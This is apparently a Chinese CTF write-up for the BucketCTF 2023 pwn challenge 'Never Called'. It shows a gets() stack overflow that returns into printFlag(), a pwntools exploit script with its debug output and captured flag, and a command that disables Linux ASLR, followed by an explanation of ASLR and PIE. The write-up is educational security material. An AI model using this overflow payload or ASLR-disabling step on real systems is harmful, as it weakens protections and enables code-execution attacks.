---
title: 从BucketCTF2023的一道PWN题来谈谈ASLR。
date: 2023-04-10 13:31:37
tags: []
cover: img/daliy.jpg
permalink: p/bucketctf2023-pwn-aslr/
alias:
  - SU15VTE/310afdf2.html
---
**本次CTF是我有史以来最高强度打的一次CTF，题目质量感觉一般，但这道题目我觉得是值得一提的。**

# 题目WP-Never Called

## 程序保护分析

``` bash
Arch:     i386-32-little
RELRO:    Full RELRO
Stack:    No canary found
NX:       NX disabled
PIE:      PIE enabled
RWX:      Has RWX segments
```

老样子先看保护，开启了PIE和RELRO，开启PIE后，我们无法通过IDA静态调试出程序的地址，因为程序的Base Address是每次都会改变的，但是题目有说明，服务器上关闭了ASLR。这就意味着PIE只会干扰我们对程序进行静态分析，我们只需要把我们环境中的ASLR也给关闭，然后动态调试，泄露出程序的Base Address，我们就能得到程序中所有东西的地址。

## 程序静态分析

在程序中，我们可以看到一个很明显的栈溢出漏洞：

``` c
int getMessage()
{
  char s[54]; // [esp+Eh] [ebp-3Ah] BYREF

  printf("Enter your name: ");
  gets(s);
  return printf("Hello, %s\n", s);
}
```

在32位程序中，我们要填充的缓冲区为 **0x3A+4** 个无用字节。

同时我们也发现了另外一个函数printFlag()能直接输出Flag给我们，那么我们只需要获取到printFlag()的地址就可以直接拿到Flag了。也就是我们的Payload就是：b’A’\*(0x3A+4) + p32(prinFlag_Addr)。

## 动态分析获取printFlag函数地址

在上文我们说到，服务器上的ASLR是关闭的，那么我们要动态调试的第一步自然就是关闭掉自己环境的ASLR，我们通过以下命令关闭掉ASLR

``` bash
echo 0 > /proc/sys/kernel/randomize_va_space
```

关闭后我们就可以进行动态调试了。用gdb打开文件下断点，我们会发现断点断在的是相对地址：

``` bash
└─# gdb-peda ./a.out                            
Reading symbols from ./a.out...
gdb-peda$ b main
Breakpoint 1 at 0x1217: file main.c, line 11.
gdb-peda$ b printFlag
Breakpoint 2 at 0x12c0: file main.c, line 28.
```

但当我们程序运行时，我们就可以获取到程序真正的地址，我们此时再获取到printFlag()的的函数地址：

``` bash
gdb-peda$ disassemble  printFlag
Dump of assembler code for function printFlag:
   0x565562ab <+0>:     push   ebp
   0x565562ac <+1>:     mov    ebp,esp
   0x565562ae <+3>:     push   ebx
```

此题就已经结束了，就那么简单。

## 编写EXP

``` python
from pwn import *
#r = remote('213.133.103.186',7902)
context(arch='i386',os='linux')
context.log_level = 'debug'
ip = "213.133.103.186"
port = 6310
#sh = remote(ip, port)
sh = process('./a.out')
payload = b'A'*(0x3A+4) + p32(0x565562ab)
#payload = b"AAA"
sh.sendline(payload)
sh.interactive()
```

因为比赛已经结束，所以我们在本地环境下运行。

``` bash
[+] Starting local process './a.out' argv=[b'./a.out'] : pid 72806
[DEBUG] Sent 0x43 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000030  41 41 41 41  41 41 41 41  41 41 41 41  41 41 ab 62  │AAAA│AAAA│AAAA│AA·b│
    00000040  55 56 0a                                            │UV·│
    00000043
[*] Switching to interactive mode
[DEBUG] Received 0x8f bytes:
    00000000  53 74 61 72  74 69 6e 67  20 70 72 6f  67 72 61 6d  │Star│ting│ pro│gram│
    00000010  0a 45 6e 74  65 72 20 79  6f 75 72 20  6e 61 6d 65  │·Ent│er y│our │name│
    00000020  3a 20 48 65  6c 6c 6f 2c  20 41 41 41  41 41 41 41  │: He│llo,│ AAA│AAAA│
    00000030  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000060  41 41 41 41  41 41 41 ab  62 55 56 0a  59 6f 75 72  │AAAA│AAA·│bUV·│Your│
    00000070  20 66 6c 61  67 3a 20 53  55 31 35 56  54 45 7b 31  │ fla│g: S│U15V│TE{1│
    00000080  5f 37 77 23  5f 74 34 65  5f 77 40 6e  7d 0a 0a     │_7w#│_t4e│_w@n│}··│
    0000008f
Starting program
Enter your name: Hello, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xabbUV
Your flag: SU15VTE{1_7w#_t4e_w@n}
```

# ASLR和PIE

## ASLR介绍

ASLR(Address space layout randomization)，是一种操作系统的安全特性，可以增加系统的安全性，防止攻击者利用已知的漏洞对系统进行攻击。

ASLR会在每次运行程序时，系统随机地分配虚拟地址空间中各个部分的地址，包括程序的代码段、数据段、堆、栈等。这样，攻击者在进行攻击时就无法确定需要攻击的代码或数据在内存中的具体位置，从而增加了攻击的难度。

ASLR可以在操作系统的内核层面实现，也可以在用户层面的应用程序中实现。ASLR的实现方式有多种，包括：

**随机化基地址**：随机化程序的基地址，使得每次运行时程序的代码段、数据段、堆、栈等的地址都发生改变。\
**随机化堆和栈的位置**：在堆和栈中随机选择一些位置进行内存分配，使得攻击者无法确定需要攻击的代码或数据在内存中的具体位置。\
**随机化函数地址**：随机化程序中各个函数的地址，使得攻击者无法确定需要攻击的函数的地址。

## Linux上的ASLR

在Linux中，我们的 **/proc/sys/kernel/randomize_va_space**中的值就是ASLR的配置：\
0: 关闭了ASLR，没有随机化保护。\
1: 开启部分随机化，系统中的**动态库**和**栈**会使用随机化地址，而其他内存区域则使用固定地址。\
2: 开启完全随机化，ASLR将随机化所有内存区域的地址：在这个级别中，ASLR将随机化所有内存区域的地址，包括库的加载地址、堆地址、栈地址、内存映射的地址、共享内存段的地址以及虚拟动态内存的地址。

## PIE介绍

PIE（Position Independent Executable）是一种编译选项，用于生成可以在内存中随机位置加载的可执行文件。在启用PIE选项的情况下，程序的基地址不再是固定的，而是在运行时由操作系统随机分配。所以在程序运行前，我们看到的都只是相对地址。

## PIE和ASLR的关系

在PIE开启时，我们无法得知程序的确切地址，这是因为ASLR给我们的程序随机分配了一个基地址，而当ASLR关闭时，程序就算是开启了PIE，系统也不会给它分配随机的基地址。

我们要清楚的是，在Linux中，ASLR是内核的一部分，而PIE不过是一个可执行文件编译时的一个选项，PIE负责随机化加载地址，但是PIE又需要ASLR开启。

现在让我们把ASLR重新打开，再次加载程序，会发现程序的基地址已改变，printFlag的地址也随之改变

``` bash
gdb-peda$ b main
Breakpoint 1 at 0x56556217: file main.c, line 11.
gdb-peda$ print $
Display all 200 possibilities? (y or n)
gdb-peda$ b printFlag
Breakpoint 2 at 0x565562c0: file main.c, line 28.
```

# 总结

本次的这道PWN题是我第一次接触开启PIE却在服务器关闭ASLR的题目，这里考察对ASLR的理解，的的确确是学到了一些东西。总的来说这次CTF玩得还是挺尽兴的。
